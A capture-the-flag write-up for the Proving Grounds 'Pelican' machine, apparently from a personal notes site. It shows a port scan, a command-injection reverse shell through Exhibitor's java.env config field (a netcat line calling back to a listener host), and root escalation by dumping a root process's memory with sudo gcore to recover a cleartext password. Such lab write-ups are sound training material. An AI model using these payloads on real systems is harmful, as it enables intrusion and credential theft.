---
layout: default
title: Pelican
parent: Proving Grounds Practice - Linux
nav_order: 7
---

# Scanning

---

```bash
                                                                                                 [17/17]
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pelican]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.98
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 00:01 EST
Nmap scan report for 192.168.232.98
Host is up (0.054s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open              Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.232.98:8080/exhibitor/v1/ui/index.html
44091/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration/Exploitation

---

## 8081 | HTTP

There is a vulnerability for Exhibitor for Zookeeper v1.0 that allows us to inject a reverse shell payload in the _java.env script_ secion of the Config menu.

```bash
Under the Config tab in the Exhibitor Web UI, the <E2><80><9C>java.env script<E2><80><9D> field can be modified and the new configuration pushed to ZooKeeper. Exhibitor launches ZooKeeper through a script, and the contents of this field are passed, unmodified, as arguments to the Java command to launch ZooKeeper, which can be seen here.

(The contents of the <E2><80><9C>java.env script<E2><80><9D> field are passed in as $JVMFLAGS.)

Based on how this argument is passed, there are several ways to execute arbitrary commands. The methods tested were surrounding the command with backticks and using $(), for example:

$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)

This example uses netcat to open a reverse shell to a listener on 10.0.0.64:4444.

```

![config](../../../assets/images/ctfs/proving_grounds/pelican/config.png)

After clicking the _commit_ button we get a reverse shell...

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/pelican]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.98] 47460
id
uid=1000(charles) gid=1000(charles) groups=1000(charles)


```

# Post-Exploitation

---

## Check Sudo Permissions for Charles

```bash
charles@pelican:/opt/zookeeper/conf$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

```

Checking GTFOBins for _gcore_ with Sudo

![gcore](../../../assets/images/ctfs/proving_grounds/pelican/gcore.png)

We can run _gcore_ with a process ID that is running as root

Checking processes...

```bash
charles@pelican:/opt/zookeeper/conf$ ps -aux | grep -i 'root'

root       493  0.0  0.0   2276    72 ?        Ss   00:37   0:00 /usr/bin/password-store

# Run gcore against PID 493
charles@pelican:/opt/zookeeper/conf$ sudo /usr/bin/gcore 493
sudo /usr/bin/gcore 493
0x00007f40ff4dd6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc48e50c90, remaining=re
maining@entry=0x7ffc48e50c90) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.493

# Run strings against the output file
charles@pelican:/opt/zookeeper/conf$ strings core.493
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
001 Password: root:
ClogKingpinInning731

```

We can use the password _ClogKingpinInning731_ to elevate to root privileges.

```bash
charles@pelican:/opt/zookeeper/conf$ su root
su root
Password: ClogKingpinInning731

root@pelican:/opt/zookeeper/conf# id
id
uid=0(root) gid=0(root) groups=0(root)
root@pelican:/opt/zookeeper/conf# whoami
whoami
root
```
